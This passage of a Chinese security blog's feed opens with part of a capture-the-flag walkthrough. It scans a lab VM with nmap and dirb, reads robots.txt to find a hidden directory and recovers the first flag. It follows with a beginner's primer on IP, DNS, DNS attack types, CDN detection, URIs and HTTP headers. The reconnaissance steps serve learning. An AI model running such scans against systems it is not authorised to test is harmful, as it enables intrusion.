Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code>&lt;/pre>&lt;p>通过 nmap 的扫描我们发现靶机开启了两个 http 的服务端口和一个 ssh 的服务端口。&lt;/p>
&lt;h3 id="3-http-目录扫描">3. http 目录扫描
&lt;/h3>&lt;p>接下来我们使用 dirb 工具对靶机进行目录和文件扫描，看看有没有什么有用的信息：&lt;/p>
&lt;pre tabindex="0">&lt;code>dirb http://192.168.1.105:80/
output：
---- Scanning URL: http://192.168.1.105:80/ ----
-----------------
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>dirb http://192.168.1.105:31337/
output：
---- Scanning URL: http://192.168.1.105:31337/ ----
+ http://192.168.1.105:31337/.bash_history (CODE:200|SIZE:19)
+ http://192.168.1.105:31337/.bashrc (CODE:200|SIZE:3526)
+ http://192.168.1.105:31337/.profile (CODE:200|SIZE:675)
+ http://192.168.1.105:31337/.ssh (CODE:200|SIZE:43)
+ http://192.168.1.105:31337/robots.txt (CODE:200|SIZE:70)
-----------------
&lt;/code>&lt;/pre>&lt;p>对两个端口进行扫描，我们发现在 31337 端口的 web 目录下存在几个敏感文件。&lt;/p>
&lt;h3 id="4-robotstxt">4. robots.txt
&lt;/h3>&lt;blockquote>
&lt;p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。&lt;/p>
&lt;/blockquote>
&lt;p>robots.txt 是我们渗透测试人员重点的查看对象，因为在这个文件下很有可能写有网站的敏感目录或者文件。&lt;/p>
&lt;p>浏览器访问：http://192.168.1.105:31337/robots.txt，发现有如下内容：&lt;/p>
&lt;pre tabindex="0">&lt;code>User-agent: *
Disallow: /.bashrc
Disallow: /.profile
Disallow: /taxes
&lt;/code>&lt;/pre>&lt;p>我们在 robots.txt 目录下发现了一个隐藏目录：&lt;strong>taxes&lt;/strong>，浏览器访问这个隐藏目录：http://192.168.1.105:31337/taxes/&lt;/p>
&lt;p>发现如下内容，很幸运我们发现了第一个 flag：&lt;/p>
&lt;pre tabindex="0">&lt;code>Good job! Here is a flag: flag1{make_america_great_again}
&lt;/code>&lt;/pre></description></item><item><title>网络知识入门</title><link>https://wlynxg.github.io/blog/p/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E5%85%A5%E9%97%A8/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E5%85%A5%E9%97%A8/</guid><description>&lt;h1 id="网络安全基本知识">网络安全基本知识
&lt;/h1>&lt;h2 id="一ip">一、IP
&lt;/h2>&lt;h3 id="1-概念">1. 概念
&lt;/h3>&lt;blockquote>
&lt;p>IP是Internet Protocol（网际互连协议）的缩写，是TCP/IP体系中的网络层协议。&lt;/p>
&lt;/blockquote>
&lt;p>现在使用的 IP 地址主要为：IPV4 和 IPV6。&lt;/p>
&lt;h3 id="2-ipv4协议">2. IPv4协议
&lt;/h3>&lt;p>IPv4 协议以 4字节，32比特表示，每个字节之间用 &amp;ldquo;.&amp;rdquo; 号分割，例如：“192.0.2.235”。&lt;/p>
&lt;p>IPv4 可用地址仅为 4,294,967,296个。2019年11月26日，全球所有43亿个IPv4地址已分配完毕，这意味着没有更多的IPv4地址可以分配给ISP和其他大型网络基础设施提供商。&lt;/p>
&lt;h3 id="3-ipv6协议">3. IPv6协议
&lt;/h3>&lt;p>IPv6 协议以 128比特表示，每个字节之间用 &amp;ldquo;:&amp;rdquo; 号分割，例如：“2031:0000:1F1F:0000:0000:0100:11A0:ADDF”。IPv6 可用地址有 2^128个。&lt;/p>
&lt;h2 id="二域名">二、域名
&lt;/h2>&lt;h3 id="1-概念-1">1. 概念
&lt;/h3>&lt;blockquote>
&lt;p>&lt;strong>域名&lt;/strong>（英语：&lt;strong>Domain Name&lt;/strong>），又称&lt;strong>网域&lt;/strong>，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。&lt;/p>
&lt;/blockquote>
&lt;h3 id="2-作用">2. 作用
&lt;/h3>&lt;p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。&lt;/p>
&lt;h3 id="3-购买">3. 购买
&lt;/h3>&lt;p>域名可用在域名提供商那里购买注册，例如&lt;a class="link" href="https://cloud.tencent.com/act/domainsales?fromSource=gwzcw.3892502.3892502.3892502&amp;amp;utm_medium=cpc&amp;amp;utm_id=gwzcw.3892502.3892502.3892502" target="_blank" rel="noopener"
>腾讯云&lt;/a>，&lt;a class="link" href="https://wanwang.aliyun.com/domain/" target="_blank" rel="noopener"
>阿里云&lt;/a>等。&lt;/p>
&lt;h3 id="4-备案">4. 备案
&lt;/h3>&lt;p>根据 《&lt;a class="link" href="http://www.scio.gov.cn/32344/32345/32347/32986/xgzc32992/Document/1438710/1438710.htm#:~:text=%20%E6%9C%AC%E5%8A%9E%E6%B3%95%E6%89%80%E7%A7%B0%E4%BA%92%E8%81%94%E7%BD%91%E4%BF%A1%E6%81%AF%E6%9C%8D%E5%8A%A1%EF%BC%8C%E6%98%AF%E6%8C%87%E9%80%9A%E8%BF%87%E4%BA%92%E8%81%94%E7%BD%91%E6%8F%90%E4%BE%9B%E4%BF%A1%E6%81%AF%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B4%BB%E5%8A%A8%E3%80%82,%E7%AC%AC%E4%B8%89%E6%9D%A1%20%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E4%B8%BB%E7%AE%A1%E9%83%A8%E9%97%A8%E4%BE%9D%E7%85%A7%E8%81%8C%E8%B4%A3%E8%B4%9F%E8%B4%A3%E4%BA%92%E8%81%94%E7%BD%91%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%EF%BC%8C%E5%8D%8F%E8%B0%83%20." target="_blank" rel="noopener"
>互联网信息服务管理办法&lt;/a>》 以及 《&lt;a class="link" href="http://www.gov.cn/gongbao/content/2005/content_93018.htm" target="_blank" rel="noopener"
>非经营性互联网信息服务备案管理办法&lt;/a>》 ，国家对非经营性互联网信息服务实行备案制度，对经营性互联网信息服务实行许可制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。即所有对中国大陆提供服务的网站都必须先进行 ICP 备案，才可开通服务。&lt;/p>
&lt;p>通俗点儿讲所谓的“备案”类似于我们国人现实生活中的“上户口”，需要提供的信息有：姓名、家庭住址（域名）、父母（网站所有人）、联系方式等等。&lt;/p>
&lt;h3 id="5-二级域名与多级域名">5. 二级域名与多级域名
&lt;/h3>&lt;p>一级域名，是由一个合法的字符串+域名后缀组成，例如：baidu.com 就是一级域名；&lt;/p>
&lt;p>二级域名：二级域名是在一级域名前面加上一个字符串，例如：baike.baidu.com；&lt;/p>
&lt;p>多级域名：多级域名就是在一级域名前加上多个字符串组成。&lt;/p>
&lt;h2 id="三dns">三、DNS
&lt;/h2>&lt;h3 id="1-概念-2">1. 概念
&lt;/h3>&lt;blockquote>
&lt;p>&lt;strong>域名系统&lt;/strong>（英文：&lt;strong>D&lt;/strong>omain &lt;strong>N&lt;/strong>ame &lt;strong>S&lt;/strong>ystem，缩写：&lt;strong>DNS&lt;/strong>）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。&lt;/p>
&lt;/blockquote>
&lt;p>国内常用 DNS：&lt;strong>114 DNS&lt;/strong>、&lt;strong>阿里DNS&lt;/strong>、&lt;strong>百度DNS&lt;/strong>、&lt;strong>360 DNS&lt;/strong>和&lt;strong>Google DNS&lt;/strong>。&lt;/p>
&lt;h3 id="2-本地-hosts-文件">2. 本地 hosts 文件
&lt;/h3>&lt;p>hosts 文件是一个没有扩展名的系统文件，可以用记事本等工具打开，作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”。&lt;/p>
&lt;p>当用户访问某个域名时，系统会首先自动从 hosts 文件中寻找对应的 IP地址。如果找到，系统会根据找到的 IP进行服务器的访问，如果没有找到，则系统会再将网址提交 DNS域名解析服务器进行IP地址的解析。&lt;/p>
&lt;p>在 Windows系统中，hosts 文件路径为：&lt;code>C:\windows\system32\drivers\etc\hosts&lt;/code> 目录下；在Linux 系统中，hosts 文件路径为：&lt;code>/etc/hosts&lt;/code>。&lt;/p>
&lt;h3 id="3-a记录和cname">3. A记录和CNAME
&lt;/h3>&lt;p>&lt;strong>A 记录&lt;/strong>：&lt;/p>
&lt;blockquote>
&lt;p>A (Address) 记录是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的网页服务器(web server)上。同时也可以设置域名的子域名。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>CNAME&lt;/strong>：&lt;/p>
&lt;blockquote>
&lt;p>CNAME 被称为规范名字，也称别名记录。当需要将多个域名需要指向同一服务器IP时，此时我们就可以将一个域名做 A记录指向服务器IP，然后将其他的域名做别名(即CNAME)到A记录的域名上。这样用户就可以在访问不同域名时访问到同一个服务。&lt;/p>
&lt;/blockquote>
&lt;h3 id="4-常见-dns-攻击">4. 常见 DNS 攻击
&lt;/h3>&lt;h4 id="域名劫持">域名劫持
&lt;/h4>&lt;p>通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的NS纪录指向到黑客可以控制的DNS服务器，然后通过在该DNS服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。&lt;/p>
&lt;h4 id="缓存投毒">缓存投毒
&lt;/h4>&lt;p>利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。&lt;/p>
&lt;h4 id="dns劫持">DNS劫持
&lt;/h4>&lt;p>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。&lt;/p>
&lt;h4 id="dns-ddos攻击">DNS DDoS攻击
&lt;/h4>&lt;p>通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。&lt;/p>
&lt;h2 id="四cdn">四、CDN
&lt;/h2>&lt;h3 id="1-概念-3">1. 概念
&lt;/h3>&lt;blockquote>
&lt;p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。&lt;/p>
&lt;/blockquote>
&lt;p>简单来说，CDN就是采用更多的缓存服务器（CDN边缘节点），布放在用户访问相对集中的地区或网络中。当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求（类似于京东这样电商的本地仓库）。&lt;/p>
&lt;h3 id="2-cdn的实现">2. CDN的实现
&lt;/h3>&lt;p>网站运行商在 CDN运营商那里购买 CDN服务时，会得到一个专有的 CDN加速 DNS 服务器地址，网站运营商将自己的域名解析到这个专有 DNS 服务器上。&lt;/p>
&lt;p>当用户请求目标网站时，本地 DNS 会返回专有 DNS服务器的地址，域名解析服务交给这个专有 DNS 服务器。CDN 运营商的专有 DNS 服务器会根据用户的 IP 地址得到用户所在的地理位置，再返回距离用户最近的 CDN服务器的地址。于是用户就会去返回的这个 CDN 服务器请求资源，从而实现用户访问的加速。&lt;/p>
&lt;h3 id="3-cdn-检测">3. CDN 检测
&lt;/h3>&lt;p>由于CDN 的机制，会对我们进行渗透测试时造成困难。因此检测网站是否使用了 CDN对我们而言是一件十分重要的事情。&lt;/p>
&lt;p>根据 CDN的原理，我们可以在不同地区访问网站，看看解析得到的IP是否是同一个，如果不是，那么该网站就可能使用了 CDN服务。&lt;/p>
&lt;p>我们可以通过各种在线服务平台对网站进行CDN检测，例如：&lt;a class="link" href="https://www.ping.cn/ping" target="_blank" rel="noopener"
>Ping.cn-全国多地区网络节点在线ping检测平台&lt;/a>等。&lt;/p>
&lt;h2 id="五url--urn--uri">五、URL + URN = URI
&lt;/h2>&lt;h3 id="1-概念-4">1. 概念
&lt;/h3>&lt;blockquote>
&lt;p>URL = Uniform Resource Locator 统一资源&lt;strong>定位符&lt;/strong>，一种定位资源的主要访问机制的字符串；&lt;/p>
&lt;p>URN = Uniform Resource Name 统一资源&lt;strong>名称&lt;/strong>，通过特定命名空间中的唯一名称或ID来标识资源；&lt;/p>
&lt;p>URI = Uniform Resource Identifier 统一资源&lt;strong>标志符&lt;/strong>，用来标识抽象或物理资源的一个紧凑字符串。&lt;/p>
&lt;/blockquote>
&lt;h3 id="2-三者之间的区别">2. 三者之间的区别
&lt;/h3>&lt;h4 id="url">URL
&lt;/h4>&lt;p>&lt;strong>标准格式：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>protocol :// hostname[:port] / path / [;parameters][?query]#fragment&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>**protocol：**协议；&lt;/li>
&lt;li>**hostname：**主机名；&lt;/li>
&lt;li>**port：**端口；&lt;/li>
&lt;li>**path：**路径；&lt;/li>
&lt;li>**parameters：**参数；&lt;/li>
&lt;li>&lt;strong>query&lt;/strong>：查询；&lt;/li>
&lt;li>**fragment：**参数片段。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>举例：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>http://127.0.0.1:8000/file/1.txt&lt;/p>
&lt;/blockquote>
&lt;h4 id="uri">URI
&lt;/h4>&lt;p>&lt;strong>标准格式：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>**user：**用户信息&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>举例：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;pre>&lt;code> hierarchical part
┌───────────────────┴─────────────────────┐
authority path
┌───────────────┴───────────────┐┌───┴────┐
&lt;/code>&lt;/pre>
&lt;p>abc://username:password@example.com:123/path/data?key=value&amp;amp;key2=value2#fragid1
└┬┘ └───────┬───────┘ └────┬────┘ └┬┘ └─────────┬─────────┘ └──┬──┘
scheme user information host port query fragment&lt;/p>
&lt;/blockquote>
&lt;h4 id="urn">URN
&lt;/h4>&lt;p>&lt;strong>举例：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>urn:example:mammal:monotreme:echidna
└┬┘ └──────────────┬───────────────┘
scheme path&lt;/p>
&lt;/blockquote>
&lt;h2 id="六http">六、HTTP
&lt;/h2>&lt;h3 id="1-概念-5">1. 概念
&lt;/h3>&lt;blockquote>
&lt;p>超文本传输协议（Hypertext Transfer Protocol，HTTP）是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。请求和响应消息的头以ASCII形式给出。&lt;/p>
&lt;/blockquote>
&lt;h3 id="2-简介">2. 简介
&lt;/h3>&lt;ul>
&lt;li>超文本传输协议（Hypertext Transfer Protocol，HTTP）是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应&lt;/li>
&lt;li>现在主要应用 http1.1 协议&lt;/li>
&lt;li>http是无状态协议，不会保存多次请求之间的关系，使用&lt;code>cookie&lt;/code>做状态管理&lt;/li>
&lt;li>持久连接节省通信量（HTTP1.1和部分HTTP1.0）&lt;/li>
&lt;li>通过请求方法告知服务器意图，&lt;code>get&lt;/code>,&lt;code>post&lt;/code>等&lt;/li>
&lt;/ul>
&lt;h3 id="3-http-请求">3. HTTP 请求
&lt;/h3>&lt;h4 id="请求报文">请求报文
&lt;/h4>&lt;p>HTTP 的请求报文包含三个部分：&lt;strong>请求行 + 请求头 + 数据体&lt;/strong>。请求头与数据体之间由空行隔开，每一个请求头之间需要换行。&lt;/p>
&lt;p>通过浏览器的 Network 选项，我们可以看到我们在请求网站时发送的 HTTP 请求头的内容：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">www.example.com&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">keep-alive&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Pragma&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.51&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>HTTP 请求报文的请求首行由：&lt;strong>请求方式 + 请求地址 + 请求协议&lt;/strong>组成。&lt;/p>
&lt;p>HTTP的头信息包括通用头、请求头、响应头和实体头四个部分。每个头域由一个域名，冒号（:）和域值三部分组成：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>通用头标&lt;/strong>：即可用于请求，也可用于响应，是作为一个整体而不是特定资源与事务相关联；&lt;/li>
&lt;li>&lt;strong>请求头标&lt;/strong>：允许客户端传递关于自身的信息和希望的响应形式；&lt;/li>
&lt;li>&lt;strong>响应头标&lt;/strong>：服务器和于传递自身信息的响应；&lt;/li>
&lt;li>&lt;strong>实体头标&lt;/strong>：定义被传送资源的信息。即可用于请求，也可用于响应；&lt;/li>
&lt;/ul>
&lt;h4 id="http-请求方法">HTTP 请求方法
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align: left">序号&lt;/th>
&lt;th style="text-align: left">方法&lt;/th>
&lt;th style="text-align: left">描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align: left">1&lt;/td>
&lt;td style="text-align: left">GET&lt;/td>
&lt;td style="text-align: left">请求指定的页面信息，并返回实体主体；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">2&lt;/td>
&lt;td style="text-align: left">HEAD&lt;/td>
&lt;td style="text-align: left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头；编写扫描工具时使用这个方法效率最高。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">3&lt;/td>
&lt;td style="text-align: left">POST&lt;/td>
&lt;td style="text-align: left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">4&lt;/td>
&lt;td style="text-align: left">PUT&lt;/td>
&lt;td style="text-align: left">从客户端向服务器传送的数据取代指定的文档的内容；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">5&lt;/td>
&lt;td style="text-align: left">DELETE&lt;/td>
&lt;td style="text-align: left">请求服务器删除指定的页面；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">6&lt;/td>
&lt;td style="text-align: left">CONNECT&lt;/td>
&lt;td style="text-align: left">HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">7&lt;/td>
&lt;td style="text-align: left">OPTIONS&lt;/td>
&lt;td style="text-align: left">允许客户端查看服务器的性能；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">8&lt;/td>
&lt;td style="text-align: left">TRACE&lt;/td>
&lt;td style="text-align: left">回显服务器收到的请求，主要用于测试或诊断；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">9&lt;/td>
&lt;td style="text-align: left">PATCH&lt;/td>
&lt;td style="text-align: left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h4 id="http-请求头">HTTP 请求头
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align: left">Header&lt;/th>
&lt;th style="text-align: left">解释&lt;/th>
&lt;th style="text-align: left">示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align: left">Accept&lt;/td>
&lt;td style="text-align: left">指定客户端能够接收的内容类型&lt;/td>
&lt;td style="text-align: left">Accept: text/plain, text/html&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Accept-Charset&lt;/td>
&lt;td style="text-align: left">浏览器可以接受的字符编码集。&lt;/td>
&lt;td style="text-align: left">Accept-Charset: iso-8859-5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Accept-Encoding&lt;/td>
&lt;td style="text-align: left">指定浏览器可以支持的web服务器返回内容压缩编码类型。&lt;/td>
&lt;td style="text-align: left">Accept-Encoding: compress, gzip&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Accept-Language&lt;/td>
&lt;td style="text-align: left">浏览器可接受的语言&lt;/td>
&lt;td style="text-align: left">Accept-Language: en,zh&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Accept-Ranges&lt;/td>
&lt;td style="text-align: left">可以请求网页实体的一个或者多个子范围字段&lt;/td>
&lt;td style="text-align: left">Accept-Ranges: bytes&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Authorization&lt;/td>
&lt;td style="text-align: left">HTTP授权的授权证书&lt;/td>
&lt;td style="text-align: left">Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Cache-Control&lt;/td>
&lt;td style="text-align: left">指定请求和响应遵循的缓存机制&lt;/td>
&lt;td style="text-align: left">Cache-Control: no-cache&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Connection&lt;/td>
&lt;td style="text-align: left">表示是否需要持久连接。（HTTP 1.1默认进行持久连接）&lt;/td>
&lt;td style="text-align: left">Connection: close&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Cookie&lt;/td>
&lt;td style="text-align: left">HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。&lt;/td>
&lt;td style="text-align: left">Cookie: $Version=1; Skin=new;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Content-Length&lt;/td>
&lt;td style="text-align: left">请求的内容长度&lt;/td>
&lt;td style="text-align: left">Content-Length: 348&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Content-Type&lt;/td>
&lt;td style="text-align: left">请求的与实体对应的MIME信息&lt;/td>
&lt;td style="text-align: left">Content-Type: application/x-www-form-urlencoded&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Date&lt;/td>
&lt;td style="text-align: left">请求发送的日期和时间&lt;/td>
&lt;td style="text-align: left">Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Expect&lt;/td>
&lt;td style="text-align: left">请求的特定的服务器行为&lt;/td>
&lt;td style="text-align: left">Expect: 100-continue&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">From&lt;/td>
&lt;td style="text-align: left">发出请求的用户的Email&lt;/td>
&lt;td style="text-align: left">From: &lt;a class="link" href="mailto:user@email.com" >user@email.com&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Host&lt;/td>
&lt;td style="text-align: left">指定请求的服务器的域名和端口号&lt;/td>
&lt;td style="text-align: left">Host: &lt;a class="link" href="https://www.zcmhi.com" target="_blank" rel="noopener"
>www.zcmhi.com&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">If-Match&lt;/td>
&lt;td style="text-align: left">只有请求内容与实体相匹配才有效&lt;/td>
&lt;td style="text-align: left">If-Match: “737060cd8c284d8af7ad3082f209582d”&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">If-Modified-Since&lt;/td>
&lt;td style="text-align: left">如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码&lt;/td>
&lt;td style="text-align: left">If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">If-None-Match&lt;/td>
&lt;td style="text-align: left">如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变&lt;/td>
&lt;td style="text-align: left">If-None-Match: “737060cd8c284d8af7ad3082f209582d”&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">If-Range&lt;/td>
&lt;td style="text-align: left">如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag&lt;/td>
&lt;td style="text-align: left">If-Range: “737060cd8c284d8af7ad3082f209582d”&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">If-Unmodified-Since&lt;/td>
&lt;td style="text-align: left">只在实体在指定时间之后未被修改才请求成功&lt;/td>
&lt;td style="text-align: left">If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Max-Forwards&lt;/td>
&lt;td style="text-align: left">限制信息通过代理和网关传送的时间&lt;/td>
&lt;td style="text-align: left">Max-Forwards: 10&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Pragma&lt;/td>
&lt;td style="text-align: left">用来包含实现特定的指令&lt;/td>
&lt;td style="text-align: left">Pragma: no-cache&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Proxy-Authorization&lt;/td>
&lt;td style="text-align: left">连接到代理的授权证书&lt;/td>
&lt;td style="text-align: left">Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Range&lt;/td>
&lt;td style="text-align: left">只请求实体的一部分，指定范围&lt;/td>
&lt;td style="text-align: left">Range: bytes=500-999&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Referer&lt;/td>
&lt;td style="text-align: left">先前网页的地址，当前请求网页紧随其后,即来路&lt;/td>
&lt;td style="text-align: left">Referer: &lt;a class="link" href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener"
>http://www.zcmhi.com/archives/71.html&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">TE&lt;/td>
&lt;td style="text-align: left">客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息&lt;/td>
&lt;td style="text-align: left">TE: trailers,deflate;q=0.5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Upgrade&lt;/td>
&lt;td style="text-align: left">向服务器指定某种传输协议以便服务器进行转换（如果支持）&lt;/td>
